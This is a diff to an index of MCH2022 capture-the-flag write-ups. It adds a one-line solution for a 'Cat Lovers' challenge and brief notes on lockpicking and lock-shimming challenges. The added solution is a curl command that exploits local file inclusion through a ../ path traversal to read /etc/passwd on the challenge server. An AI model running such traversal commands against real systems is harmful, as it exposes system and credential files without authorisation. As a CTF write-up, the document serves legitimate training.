@@ -34,6 +34,8 @@ Secure Router: https://github.com/craig/MCH2022-CTF/blob/main/secure_router.txt
 
 Captcha: https://github.com/craig/MCH2022-CTF/blob/main/captcha.txt
 
+Cat Lovers: simple LFI, curl https://catlovers.ctf.zone/image.php?file=../../../../etc/passwd | grep catlover | cut -d: -f5
+
 ## Network
 
 ## Misc
@@ -43,3 +45,9 @@ Rogue Wifi: https://github.com/craig/MCH2022-CTF/blob/main/rogue_wifi.txt
 Access Control 1: https://github.com/craig/MCH2022-CTF/blob/main/accesscontrol1.txt
 
 Access Control 2: https://github.com/craig/MCH2022-CTF/blob/main/accesscontrol2.txt
+
+Locked Locks 1: A lock in a white case, needs lockpicking.
+
+Locked Locks 2: A lock in a black case, needs lockpicking and is hard, due to a security pin.
+
+Lost Combination: A simple shimming challenge. https://en.wikipedia.org/wiki/Shim_(lock_pick)
